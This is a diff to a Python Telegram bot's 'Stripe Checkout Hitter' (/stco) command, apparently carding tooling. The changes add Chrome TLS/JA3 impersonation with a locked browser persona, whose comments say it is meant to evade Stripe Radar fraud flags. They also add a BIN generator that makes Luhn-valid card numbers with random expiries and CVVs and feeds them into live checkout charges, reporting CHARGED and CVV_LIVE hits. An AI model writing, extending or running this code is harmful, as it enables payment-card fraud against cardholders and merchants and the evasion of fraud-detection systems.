@@ -18093,53 +18093,130 @@ warnings.filterwarnings("ignore", category=DeprecationWarning)
 # ============ TLS BYPASS FOR STCO ============
 
 class STCOTLSBypass:
-    """Handle TLS bypass and connection pooling for /stco"""
-    
-    def __init__(self):
+    """TLS/JA3 bypass + locked browser profile for /stco.
+
+    Stripe fingerprints the TLS handshake (JA3/JA4), not just the headers, so
+    the client returned here is a curl_cffi Chrome-impersonated session — a
+    real Chrome handshake — instead of httpx.
+
+    PROFILE LOCK
+    ------------
+    * One impersonate profile (STCO_IMPERSONATE) and ONE user-agent /
+      sec-ch-ua set are locked for the whole process, so the session GET, the
+      /init call and the /confirm call all present the same fingerprint.
+      (A UA that changes mid-flow, or a Firefox UA on a Chrome TLS stack, is
+      exactly what Radar flags.)
+    * Each (profile, proxy) pair keeps ONE long-lived session behind its own
+      asyncio lock, so two users can never share a proxy or a cookie jar.
+    """
+
+    def __init__(self, impersonate: str = STCO_IMPERSONATE):
+        self.impersonate = impersonate
+        self._clients = {}          # (profile, proxy) -> client
+        self._locks = {}            # (profile, proxy) -> asyncio.Lock
+        self._registry_lock = None  # created lazily (loop-safe)
+        self._persona = None
         self.ssl_context = None
-        self.session_client = None
-        self._client_lock = asyncio.Lock()
-        
+
+    # ── locked browser persona ────────────────────────────────────────
+    def persona(self) -> dict:
+        """The locked Chrome persona used by every /stco request."""
+        if self._persona is None:
+            # chrome124 -> "124"
+            major = "".join(ch for ch in str(self.impersonate) if ch.isdigit()) or "124"
+            self._persona = {
+                "impersonate": self.impersonate,
+                "major": major,
+                "ua": (
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                    "AppleWebKit/537.36 (KHTML, like Gecko) "
+                    f"Chrome/{major}.0.0.0 Safari/537.36"
+                ),
+                "sec_ch_ua": (
+                    f'"Google Chrome";v="{major}", "Chromium";v="{major}", '
+                    '"Not=A?Brand";v="99"'
+                ),
+                "accept_language": "en-US,en;q=0.9",
+            }
+        return self._persona
+
+    # ── legacy helper (httpx fallback only) ───────────────────────────
     def get_ssl_context(self) -> ssl.SSLContext:
-        """Get SSL context with TLS bypass"""
+        """Relaxed SSL context, used only when curl_cffi is unavailable."""
         if self.ssl_context is None:
             try:
                 self.ssl_context = ssl.create_default_context(
                     ssl.Purpose.SERVER_AUTH,
                     cafile=certifi.where()
                 )
-            except:
+            except Exception:
                 self.ssl_context = ssl.create_default_context()
-                self.ssl_context.check_hostname = False
-                self.ssl_context.verify_mode = ssl.CERT_NONE
-            
-            # TLS bypass - disable checks
+
             self.ssl_context.check_hostname = False
             self.ssl_context.verify_mode = ssl.CERT_NONE
-            
-            # Force TLS 1.2 or 1.3
+
             try:
                 self.ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2
                 self.ssl_context.maximum_version = ssl.TLSVersion.TLSv1_3
-            except:
+            except Exception:
                 pass
-            
-            # Set ciphers for better compatibility
+
             try:
-                self.ssl_context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
-            except:
+                self.ssl_context.set_ciphers(
+                    'ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS'
+                )
+            except Exception:
                 pass
-            
+
         return self.ssl_context
-    
-    async def get_client(self, proxy: str = None) -> httpx.AsyncClient:
-        """Get HTTPX client with TLS bypass and connection pooling"""
-        
-        async with self._client_lock:
-            if self.session_client is None or self.session_client.is_closed:
+
+    # ── internals ─────────────────────────────────────────────────────
+    def _key(self, proxy, impersonate=None):
+        return (impersonate or self.impersonate, proxy or "")
+
+    async def _key_lock(self, key):
+        if self._registry_lock is None:
+            self._registry_lock = asyncio.Lock()
+        async with self._registry_lock:
+            lock = self._locks.get(key)
+            if lock is None:
+                lock = asyncio.Lock()
+                self._locks[key] = lock
+            return lock
+
+    async def get_client(self, proxy: str = None, impersonate: str = None):
+        """Return the locked, Chrome-impersonated client for (profile, proxy)."""
+        profile = impersonate or self.impersonate
+        key = self._key(proxy, profile)
+        lock = await self._key_lock(key)
+
+        async with lock:
+            client = self._clients.get(key)
+            if client is not None and not getattr(client, "is_closed", False):
+                return client
+            self._clients.pop(key, None)
+
+            proxy_url = None
+            if proxy:
+                try:
+                    proxy_url = format_proxy_stco(proxy)
+                except Exception:
+                    proxy_url = proxy
+
+            if _CURL_CFFI_AVAILABLE:
+                client = CurlCffiAsyncClient(
+                    impersonate=profile,
+                    proxy=proxy_url,
+                    timeout=60.0,
+                )
+                print(
+                    f"🔒 [STCO] TLS bypass active — curl_cffi {profile}"
+                    f"{' via proxy ' + mask_proxy_stco(proxy_url) if proxy_url else ' (direct)'}"
+                )
+            else:
+                # Last resort: plain httpx with relaxed TLS. Stripe may flag it.
                 ssl_context = self.get_ssl_context()
-                
-                client_kwargs = {
+                kwargs = {
                     'timeout': httpx.Timeout(60.0, connect=15.0, read=50.0),
                     'verify': ssl_context,
                     'follow_redirects': True,
@@ -18148,23 +18225,36 @@ class STCOTLSBypass:
                         max_connections=50,
                         keepalive_expiry=60
                     ),
-                    'http2': True,
                 }
-                
-                if proxy:
-                    proxy_url = format_proxy_stco(proxy)
-                    if proxy_url:
-                        client_kwargs['proxy'] = proxy_url
-                
-                self.session_client = httpx.AsyncClient(**client_kwargs)
-            
-            return self.session_client
-    
-    async def close(self):
-        """Close the session client"""
-        if self.session_client:
-            await self.session_client.aclose()
-            self.session_client = None
+                if proxy_url:
+                    kwargs['proxy'] = proxy_url
+                client = httpx.AsyncClient(**kwargs)
+                print("⚠️ [STCO] curl_cffi missing — httpx TLS fallback (may be flagged)")
+
+            self._clients[key] = client
+            return client
+
+    async def close(self, proxy: str = None):
+        """Close one client (proxy given) or every cached client."""
+        if proxy is None:
+            items = list(self._clients.items())
+            self._clients.clear()
+        else:
+            key = self._key(proxy)
+            client = self._clients.pop(key, None)
+            items = [(key, client)] if client is not None else []
+
+        for _k, client in items:
+            try:
+                closer = getattr(client, "aclose", None) or getattr(client, "close", None)
+                if closer is None:
+                    continue
+                result = closer()
+                if asyncio.iscoroutine(result):
+                    await result
+            except Exception:
+                pass
+
 
 # Create global instance
 stco_tls = STCOTLSBypass()
@@ -18423,7 +18513,7 @@ async def get_checkout_info_display_stco(url: str) -> dict:
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Origin': 'https://checkout.stripe.com',
                     'Referer': 'https://checkout.stripe.com/',
-                    'User-Agent': get_random_user_agent_stco(),
+                    'User-Agent': stco_tls.persona()['ua'],
                 },
                 data=init_body
             )
@@ -18501,8 +18591,8 @@ async def get_checkout_session_stco(cs_id: str, pk: str, proxy: str = None) -> D
             'Accept': 'application/json',
             'Origin': 'https://js.stripe.com',
             'Referer': 'https://js.stripe.com/',
-            'User-Agent': get_random_user_agent_stco(),
-            'sec-ch-ua': '"Google Chrome";v="151", "Chromium";v="151", "Not=A?Brand";v="99"',
+            'User-Agent': stco_tls.persona()['ua'],
+            'sec-ch-ua': stco_tls.persona()['sec_ch_ua'],
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
         })
@@ -18522,6 +18612,83 @@ async def get_checkout_session_stco(cs_id: str, pk: str, proxy: str = None) -> D
 # ============ CHARGE SINGLE CARD ============
 
 # ============ UPDATED CHARGE FUNCTION - FIXED EMAIL ============
+
+def _stco_init_totals(init_data, session_data=None):
+    """Safely pull (init_checksum, expected_total, subtotal) out of /init.
+
+    Stripe sends "line_item_group": null for some sessions (already
+    finalised, zero line items, expired cart). Naively doing
+    `init_data.get("line_item_group", {}).get("total")` crashes there with
+    "'NoneType' object has no attribute 'get'".
+
+    Returns ("", 0, 0) when nothing usable is present, never raises.
+    """
+    checksum = ""
+    total = 0
+    subtotal = 0
+
+    if isinstance(init_data, dict):
+        checksum = init_data.get("init_checksum") or ""
+
+        lig = init_data.get("line_item_group")
+        if isinstance(lig, dict):
+            total = lig.get("total") or 0
+            subtotal = lig.get("subtotal") or 0
+
+        if not total:
+            for key in ("total", "amount_total", "amount_due", "amount"):
+                val = init_data.get(key)
+                if isinstance(val, (int, float)) and not isinstance(val, bool) and val:
+                    total = val
+                    break
+
+        if not total:
+            for key in ("invoice", "payment_page", "session"):
+                sub = init_data.get(key)
+                if isinstance(sub, dict):
+                    for tkey in ("amount_due", "total", "amount_total"):
+                        val = sub.get(tkey)
+                        if isinstance(val, (int, float)) and not isinstance(val, bool) and val:
+                            total = val
+                            break
+                    if not subtotal:
+                        sval = sub.get("subtotal")
+                        if isinstance(sval, (int, float)) and not isinstance(sval, bool):
+                            subtotal = sval
+                if total:
+                    break
+
+    # Fall back to the checkout-session object fetched earlier.
+    if not total and isinstance(session_data, dict):
+        for key in ("amount_total", "amount_due", "total"):
+            val = session_data.get(key)
+            if isinstance(val, (int, float)) and not isinstance(val, bool) and val:
+                total = val
+                break
+        if not total:
+            lig = session_data.get("line_item_group")
+            if isinstance(lig, dict):
+                total = lig.get("total") or 0
+                subtotal = lig.get("subtotal") or 0
+
+    try:
+        total = int(total) if not isinstance(total, bool) else 0
+    except (TypeError, ValueError):
+        total = 0
+    try:
+        subtotal = int(subtotal) if not isinstance(subtotal, bool) else 0
+    except (TypeError, ValueError):
+        subtotal = 0
+
+    # Stripe validates the "last displayed" amounts against the session.
+    # A missing subtotal can safely become the total, but a subtotal ABOVE
+    # the total is legitimate (subtotal 299 - discount 70 = total 229), so
+    # never clamp it down.
+    if not subtotal:
+        subtotal = total
+
+    return checksum, total, subtotal
+
 
 async def charge_single_card_stco(card, checkout_data: dict, session_data: dict, proxy_str: str = None, 
                                    bypass_3ds: bool = False, max_retries: int = 3) -> dict:
@@ -18622,7 +18789,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
             print(f"💳 Card: {cc[:6]}****** | {month}/{year_full} | CVV: {cvv}")
             
             fp = {
-                'ua': get_random_user_agent_stco(),
+                'ua': stco_tls.persona()['ua'],
                 'stripe_js': get_stripe_js_version_stco(),
             }
             
@@ -18665,6 +18832,8 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     return result
                 
                 init_data = init_response.json()
+                if not isinstance(init_data, dict):
+                    init_data = {}
                 
                 if "error" in init_data:
                     print(f"❌ Init error: {init_data['error']}")
@@ -18692,8 +18861,8 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                 result["time"] = round(time.perf_counter() - start, 2)
                 return result
             
-            checksum = init_data.get("init_checksum", "")
-            total = init_data.get("line_item_group", {}).get("total", 0)
+            checksum, total, subtotal = _stco_init_totals(init_data, session_data)
+            print(f"💰 Init OK — checksum: {'yes' if checksum else 'MISSING'} | total: {total} | subtotal: {subtotal}")
 
             # ============ BUILD CONFIRM PARAMS ============
             # IMPORTANT: Use the session's pre-set email
@@ -18708,32 +18877,33 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                 ("payment_method_data[billing_details][name]", full_name),
                 ("payment_method_data[billing_details][email]", customer_email),  # USE SESSION EMAIL
                 ("payment_method_data[billing_details][address][country]", "US"),
-                ("payment_method_data[billing_details][address][postal_code]", "10010"),
+                ("payment_method_data[billing_details][address][line1]", "1701 W Ashley Rd"),
+                ("payment_method_data[billing_details][address][city]", "Boonville"),
+                ("payment_method_data[billing_details][address][state]", "MO"),
+                ("payment_method_data[billing_details][address][postal_code]", "65233"),
                 ("payment_method_data[pasted_fields]", "number"),
-                ("payment_method_data[payment_user_agent]", f"stripe.js/{fp['stripe_js']}; stripe-js-v3/{fp['stripe_js']}; checkout"),
+                ("payment_method_data[payment_user_agent]", f"stripe.js/{fp['stripe_js']}; stripe-js-v3/{fp['stripe_js']}; payment-element"),
                 ("payment_method_data[referrer]", "https://checkout.stripe.com"),
                 ("payment_method_data[time_on_page]", str(random.randint(30000, 200000))),
                 ("payment_method_data[client_attribution_metadata][client_session_id]", sess_id),
-                ("payment_method_data[client_attribution_metadata][checkout_session_id]", cs),
                 ("payment_method_data[client_attribution_metadata][merchant_integration_source]", "elements"),
                 ("payment_method_data[client_attribution_metadata][merchant_integration_subtype]", "payment-element"),
                 ("payment_method_data[client_attribution_metadata][merchant_integration_version]", "2021"),
-                ("payment_method_data[client_attribution_metadata][payment_intent_creation_flow]", "deferred"),
+                ("payment_method_data[client_attribution_metadata][payment_intent_creation_flow]", "standard"),
                 ("payment_method_data[client_attribution_metadata][payment_method_selection_flow]", "automatic"),
                 ("payment_method_data[client_attribution_metadata][elements_session_id]", elem_sess),
                 ("payment_method_data[client_attribution_metadata][elements_session_config_id]", f"{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}-{random.randint(1,999)}"),
-                ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]", "paymentForm"),
-                ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][1]", "currencySelector"),
-                ("guid", guid),
-                ("muid", muid),
-                ("sid", sid),
+                ("payment_method_data[client_attribution_metadata][merchant_integration_additional_elements][0]", "payment"),
+                ("payment_method_data[guid]", guid),
+                ("payment_method_data[muid]", muid),
+                ("payment_method_data[sid]", sid),
                 ("init_checksum", checksum),
                 ("version", fp['stripe_js']),
                 ("expected_amount", str(total)),
-                ("last_displayed_line_item_group_details[subtotal]", str(total)),
+                ("last_displayed_line_item_group_details[subtotal]", str(subtotal)),
                 ("last_displayed_line_item_group_details[total_exclusive_tax]", "0"),
                 ("last_displayed_line_item_group_details[total_inclusive_tax]", "0"),
-                ("last_displayed_line_item_group_details[total_discount_amount]", "0"),
+                ("last_displayed_line_item_group_details[total_discount_amount]", str(max(subtotal - total, 0))),
                 ("last_displayed_line_item_group_details[shipping_rate_amount]", "0"),
                 ("expected_payment_method_type", "card"),
                 ("key", pk),
@@ -18752,7 +18922,7 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                 "Origin": "https://js.stripe.com",
                 "Referer": "https://js.stripe.com/",
                 "User-Agent": fp["ua"],
-                "sec-ch-ua": '"Google Chrome";v="151", "Chromium";v="151", "Not=A?Brand";v="99"',
+                "sec-ch-ua": stco_tls.persona()['sec_ch_ua'],
                 "sec-ch-ua-mobile": "?0",
                 "sec-ch-ua-platform": '"Windows"',
                 "sec-fetch-dest": "empty",
@@ -18786,6 +18956,18 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                 error_code = err.get("code", "")
                 
                 print(f"❌ Stripe Error: {error_code} - {error_msg}")
+                # checkout_confirm_error is deliberately generic — dump
+                # whatever Stripe did send so the real reason is visible.
+                try:
+                    print(f"🧾 Confirm error body: {json.dumps(conf)[:900]}")
+                    _extra = err.get("extra_fields") or {}
+                    if _extra:
+                        print(f"🧾 Confirm extra_fields: {json.dumps(_extra)[:400]}")
+                    _pi = conf.get("payment_intent") or {}
+                    if isinstance(_pi, dict) and _pi.get("last_payment_error"):
+                        print(f"🧾 Last payment error: {json.dumps(_pi['last_payment_error'])[:400]}")
+                except Exception:
+                    pass
                 
                 attempt_data["error"] = error_msg
                 attempt_data["error_code"] = error_code
@@ -18796,13 +18978,21 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     dc = err.get("decline_code", "")
                     if "insufficient" in error_msg.lower() or "funds" in error_msg.lower():
                         result["status"] = "INSUFFICIENT_FUNDS"
-                        result["response"] = f"Insufficient funds: {error_msg}"
+                        result["response"] = "INSUFFICIENT_FUNDS"
                     elif "cvv" in error_msg.lower() or "security" in error_msg.lower():
                         result["status"] = "CVV_LIVE"
-                        result["response"] = f"CVV verification failed: {error_msg}"
+                        result["response"] = "CVV_LIVE"
                     else:
                         result["status"] = "DECLINED"
-                        result["response"] = f"{dc.upper()}: {error_msg}" if dc else error_msg
+                        result["response"] = (dc or "DECLINED").upper()
+                elif ("no longer active" in error_msg.lower()
+                      or error_code in ("checkout_session_expired", "resource_missing")):
+                    # Expired / already-used checkout link — nothing else can
+                    # succeed on this session, so stop the whole run here.
+                    result["status"] = "SESSION_EXPIRED"
+                    result["response"] = "Session Expired"
+                    result["fatal"] = True
+                    print("🛑 Checkout session is no longer active — stopping.")
                 else:
                     result["status"] = "ERROR"
                     result["response"] = error_msg
@@ -18820,9 +19010,21 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
                     result["response"] = "Payment Successful"
                     print(f"✅✅✅ CHARGED SUCCESSFULLY! ✅✅✅")
                 elif st == "requires_action":
-                    result["status"] = "3DS" if not bypass_3ds else "3DS SKIP"
-                    result["response"] = "3DS Required" if not bypass_3ds else "3DS Cannot be bypassed"
-                    print(f"🔐 3DS Required")
+                    # Stripe reports "requires_action" both for a 3DS challenge
+                    # and for the hCaptcha gate some merchants add.
+                    _na = pi.get("next_action") or {}
+                    _na_type = str((_na or {}).get("type", "")).lower()
+                    if not bypass_3ds:
+                        result["status"] = "3DS"
+                        if "use_stripe_sdk" in _na_type or "3d" in _na_type or "redirect" in _na_type:
+                            result["response"] = "3DS Required"
+                        else:
+                            result["response"] = "3DS / hCaptcha Required"
+                    else:
+                        # Cannot pass the challenge -> treat as fraud-blocked
+                        result["status"] = "FRAUDULENT"
+                        result["response"] = "FRAUDULENT"
+                    print(f"🔐 {result['response']}")
                 elif st == "requires_payment_method":
                     result["status"] = "DECLINED"
                     result["response"] = "Card Declined"
@@ -18870,6 +19072,179 @@ async def charge_single_card_stco(card, checkout_data: dict, session_data: dict,
 
 # ============ FIXED STCO COMMAND WITH HIT NOTIFICATION ============
 
+
+# ══════════════════════════════════════════════════════════════════════
+#  BIN GENERATOR  —  /gen <bin>   ·   /stco <url> <bin>
+#
+#  A 6 or 8 digit BIN is enough: the rest of the PAN is filled randomly,
+#  the Luhn check digit is computed, and a future expiry + CVV are added.
+# ══════════════════════════════════════════════════════════════════════
+
+STCO_BIN_GEN_COUNT = 10      # how many cards a lone BIN produces
+
+
+def _luhn_checksum_digit(number: str) -> str:
+    """Return the Luhn check digit that completes `number`."""
+    digits = [int(d) for d in str(number)]
+    total = 0
+    # The check digit will be appended, so the right-most existing digit is
+    # the one that gets doubled.
+    for i, d in enumerate(reversed(digits)):
+        if i % 2 == 0:
+            d *= 2
+            if d > 9:
+                d -= 9
+        total += d
+    return str((10 - (total % 10)) % 10)
+
+
+def _gen_expiry_stco():
+    """Random future expiry -> ("MM", "YYYY") in 2026..2032."""
+    return f"{random.randint(1, 12):02d}", str(random.randint(2026, 2032))
+
+
+def generate_cards_from_bin_stco(bin_prefix, count: int = STCO_BIN_GEN_COUNT) -> list:
+    """Build `count` Luhn-valid cards from a 6 or 8 digit BIN.
+
+    Returns a list of dicts: [{"cc","month","year","cvv"}, ...]
+    (same shape /whop's BIN mode expects).
+    """
+    prefix = re.sub(r"\D", "", str(bin_prefix or ""))
+    if len(prefix) not in (6, 8):
+        return []
+    try:
+        count = max(1, min(int(count), 100))
+    except Exception:
+        count = STCO_BIN_GEN_COUNT
+
+    # Amex is 15 digits, everything else here is 16.
+    amex = prefix[:2] in ("34", "37")
+    length = 15 if amex else 16
+    if len(prefix) >= length:
+        return []
+
+    cards, seen, attempts = [], set(), 0
+    while len(cards) < count and attempts < count * 60:
+        attempts += 1
+        body_len = length - len(prefix) - 1        # room for the check digit
+        body = prefix + "".join(random.choice("0123456789") for _ in range(body_len))
+        number = body + _luhn_checksum_digit(body)
+        if number in seen:
+            continue
+        seen.add(number)
+        month, year = _gen_expiry_stco()
+        cvv_len = 4 if amex else 3
+        cvv = "".join(random.choice("0123456789") for _ in range(cvv_len))
+        cards.append({"cc": number, "month": month, "year": year, "cvv": cvv})
+    return cards
+
+
+def format_bin_cards(cards) -> list:
+    """['cc|mm|yyyy|cvv', ...] from the dicts returned above."""
+    return [f"{c['cc']}|{c['month']}|{c['year']}|{c['cvv']}" for c in cards]
+
+
+def _find_bin_token(text: str):
+    """First standalone 6 or 8 digit BIN token in `text` (or None)."""
+    m = re.search(r"(?<!\d)(\d{6}|\d{8})(?!\d)", text or "")
+    return m.group(1) if m else None
+
+
+async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """/gen <bin> [count] — generate Luhn-valid cards from a BIN."""
+    message = update.effective_message
+    args = list(context.args or [])
+
+    # Run once per message (a reply can reach this twice: the
+    # CommandHandler and the group-1 reply handler).
+    try:
+        _mk = (message.chat_id, message.message_id)
+    except Exception:
+        _mk = None
+    if _mk is not None:
+        if _mk in _GEN_HANDLED_MSGS:
+            return
+        _GEN_HANDLED_MSGS.add(_mk)
+        if len(_GEN_HANDLED_MSGS) > 500:
+            _GEN_HANDLED_MSGS.clear()
+
+    bin_token = None
+    count = STCO_BIN_GEN_COUNT
+    for a in args:
+        digits = re.sub(r"\D", "", str(a))
+        if bin_token is None and len(digits) in (6, 8):
+            bin_token = digits
+        elif bin_token is not None and digits.isdigit():
+            try:
+                count = max(1, min(int(digits), 100))
+            except Exception:
+                pass
+
+    # ── Reply mode: "/gen" replying to a BIN (or a card/file) ────────
+    if not bin_token:
+        _reply = getattr(message, "reply_to_message", None)
+        if _reply is not None:
+            _src = "\n".join(t for t in ((_reply.text or ""), (_reply.caption or "")) if t)
+            if not _src and getattr(_reply, "document", None):
+                try:
+                    _f = await context.bot.get_file(_reply.document.file_id)
+                    _raw = await _f.download_as_bytearray()
+                    _src = _raw.decode("utf-8", errors="ignore")[:4000]
+                except Exception:
+                    _src = ""
+            if _src:
+                _tok = _find_bin_token(_src)
+                if _tok:
+                    bin_token = _tok
+                else:
+                    # a full card was replied -> reuse its BIN
+                    _pan = re.search(r"(?<!\d)(\d{15,19})(?!\d)", _src)
+                    if _pan:
+                        bin_token = _pan.group(1)[:6]
+                if bin_token:
+                    print(f"📦 [/gen reply] BIN {bin_token} from replied message")
+
+    if not bin_token:
+        await message.reply_text(
+            "🎲 <b>BIN Generator</b>\n\n"
+            "Usage: <code>/gen &lt;bin&gt; [count]</code>\n"
+            "Example: <code>/gen 601100</code>\n"
+            "Example: <code>/gen 601100 20</code>\n\n"
+            "BIN must be 6 or 8 digits. Default: 10 cards.\n\n"
+            "Tip: reply to a message (or .txt) containing a BIN with "
+            "<code>/gen</code> to use that BIN.",
+            parse_mode=ParseMode.HTML)
+        return
+
+    cards = generate_cards_from_bin_stco(bin_token, count)
+    if not cards:
+        await message.reply_text("❌ Could not generate cards for that BIN.")
+        return
+
+    try:
+        info = _get_fallback_bin_info(bin_token[:6])
+        brand, bank, country = info[0], info[1], info[2]
+    except Exception:
+        brand, bank, country = "Unknown", "Unknown", "Unknown"
+
+    _pe = premium_emoji
+    body = "\n".join(format_bin_cards(cards))
+    await message.reply_text(
+        f"{_pe('5039670412733055750', '💎')} <b>BIN Generator</b>\n\n"
+        f"{_pe('6041705726206808304', '🚀')} <b>BIN</b> ➳ <code>{bin_token}</code>\n"
+        f"{_pe('5307905813451397794', '🔋')} <b>Brand</b> ➳ <b>{brand}</b>\n"
+        f"{_pe('6266887537231402474', '🌟')} <b>Bank</b> ➳ <b>{bank}</b>\n"
+        f"{_pe('6267091732861555879', '🤩')} <b>Country</b> ➳ <b>{country}</b>\n"
+        f"\n"
+        f"{_pe('6266967801580231067', '✅')} <b>Generated</b> ➳ <b>{len(cards)}</b>\n"
+        f"<code>{body}</code>",
+        parse_mode=ParseMode.HTML)
+
+
+_STCO_HANDLED_MSGS = set()
+_GEN_HANDLED_MSGS = set()    # /gen runs already started (reply double-fire guard)   # (chat_id, message_id) of /stco runs already started
+
+
 async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """
     Stripe Checkout Hitter - /stco <url> <card>
@@ -18910,7 +19285,65 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     def pe(emoji_id, fallback):
         return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'
     
+    # ── Run once per message ──────────────────────────────────────────
+    # A reply can reach this function twice (group-0 CommandHandler + the
+    # group-1 reply handler), which would charge the card twice.
+    try:
+        _mk = (message.chat_id, message.message_id)
+    except Exception:
+        _mk = None
+    if _mk is not None:
+        if _mk in _STCO_HANDLED_MSGS:
+            print("⏭️ [/stco] duplicate invocation ignored")
+            return
+        _STCO_HANDLED_MSGS.add(_mk)
+        if len(_STCO_HANDLED_MSGS) > 500:
+            _STCO_HANDLED_MSGS.clear()
+
     text = message.text or ""
+
+    # ── Reply support ─────────────────────────────────────────────────
+    # Reply to a message containing a Stripe checkout link with
+    # "/stco <card>" and the URL is taken from the replied message.
+    _reply = getattr(message, "reply_to_message", None)
+    if _reply is not None and not extract_checkout_url(text):
+        _replied = (_reply.text or _reply.caption or "")
+        _rurl = extract_checkout_url(_replied) if _replied else None
+        if not _rurl:
+            for _ent in (getattr(_reply, "entities", None) or []):
+                _u = getattr(_ent, "url", None)
+                if _u:
+                    _rurl = extract_checkout_url(_u)
+                    if _rurl:
+                        break
+        if not _rurl and getattr(_reply, "reply_markup", None):
+            try:
+                for _row in getattr(_reply.reply_markup, "inline_keyboard", []) or []:
+                    for _btn in _row:
+                        if getattr(_btn, "url", None):
+                            _rurl = extract_checkout_url(_btn.url)
+                            if _rurl:
+                                break
+                    if _rurl:
+                        break
+            except Exception:
+                pass
+        if _rurl:
+            _m = re.match(r'^\s*/stco(@\w+)?\s*', text, re.IGNORECASE)
+            _rest = (text[_m.end():] if _m else text).strip()
+            if not _rest and _replied:
+                # no card typed after /stco -> take it from the replied text
+                try:
+                    _cards = card_formatter.extract_cards(_replied)
+                    if _cards:
+                        _rest = ' '.join(_cards)
+                except Exception:
+                    pass
+            text = f"/stco {_rurl} {_rest}".strip()
+            print(f"📦 [/stco reply] URL from replied message: {_rurl[:70]}...")
+        else:
+            print("📦 [/stco reply] no Stripe checkout URL in the replied message")
+
     lines = text.strip().split('\n')
     first_line = lines[0] if lines else ""
     first_line_args = first_line.split(maxsplit=3)
@@ -18967,6 +19400,20 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await message.reply_text(f"❌ Failed to read file: {str(e)[:50]}")
                 return
     
+    # ── BIN mode: "/stco <url> 601100" -> generate and hit cards ────────
+    if not cards:
+        _scan = text
+        try:
+            _scan = text.replace(url, " ")
+        except Exception:
+            pass
+        _bin_tok = _find_bin_token(_scan)
+        if _bin_tok:
+            # Silent BIN mode — no extra chat message, the progress card
+            # that follows already shows what is happening.
+            cards = generate_cards_from_bin_stco(_bin_tok, STCO_BIN_GEN_COUNT)
+            print(f"🎲 [stco] BIN mode {_bin_tok} -> generated {len(cards)} cards")
+
     if not cards:
         await message.reply_text("❌ No valid cards found")
         return
@@ -19056,7 +19503,7 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     progress_text += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ 0/{len(cards)}\n\n"
     if cards:
-        progress_text += f" {cards[0].get('cc', '')}|{cards[0].get('month', '')}|{cards[0].get('year', '')}|{cards[0].get('cvv', '')}\n"
+        progress_text += f"<code>{cards[0].get('cc', '')}|{cards[0].get('month', '')}|{cards[0].get('year', '')}|{cards[0].get('cvv', '')}</code>\n"
     progress_text += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['time'], '⏳')} Processing..."
     
     progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
@@ -19081,7 +19528,7 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 progress_text += f"{pe(PREMIUM_EMOJI_IDS['target'], '🎯')} <b>Success Url</b> ➳ N/A\n"
             
             progress_text += f"{pe(PREMIUM_EMOJI_IDS['stats'], '📊')} <b>Progress</b> ➳ {idx-1}/{len(cards)}\n\n"
-            progress_text += f" {card.get('cc', '')}|{card.get('month', '')}|{card.get('year', '')}|{card.get('cvv', '')}\n"
+            progress_text += f"<code>{card.get('cc', '')}|{card.get('month', '')}|{card.get('year', '')}|{card.get('cvv', '')}</code>\n"
             progress_text += f"    ⤷ {pe(PREMIUM_EMOJI_IDS['time'], '⏳')} Processing..."
             
             await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
@@ -19119,6 +19566,10 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         print(f"📊 Result: {result.get('status', 'UNKNOWN')} - {result.get('response', 'Unknown')[:50]}")
         
+        if result.get('status') == 'SESSION_EXPIRED':
+            print("🛑 Checkout session is no longer active — stopping all remaining cards.")
+            break
+
         if result['status'] == 'CHARGED':
             charged_card = result
             charged_card_data = {
@@ -19134,75 +19585,59 @@ async def stco_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     total_time = round(time.perf_counter() - start_time, 2)
     
     # Build response
-    response = f"┏━━━━━━━⍟\n"
-    response += f"┃ {pe(PREMIUM_EMOJI_IDS['diamond'], '💳')} <b>Stripe Charge Result</b>\n"
-    response += f"┗━━━━━━━━━━━⊛\n\n"
+    response = f"{pe(PREMIUM_EMOJI_IDS['diamond'], '💳')} <b>Stripe Charge Result</b>\n\n"
     
-    response += f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ {merchant_name}\n"
-    response += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Amount</b> ➳ {price_display}\n"
+    response += f"{pe(PREMIUM_EMOJI_IDS['globe'], '🌐')} <b>Site</b> ➳ <b>{merchant_name}</b>\n"
+    response += f"{pe(PREMIUM_EMOJI_IDS['money'], '💰')} <b>Amount</b> ➳ <b>{price_display}</b>\n"
     
     if charged_card:
-        response += f"{pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} <b>Status</b> ➳ Paid ✅\n"
+        response += f"{pe(PREMIUM_EMOJI_IDS['charged'], '🔥')} <b>Status</b> ➳ <b>Paid ✅</b>\n"
     else:
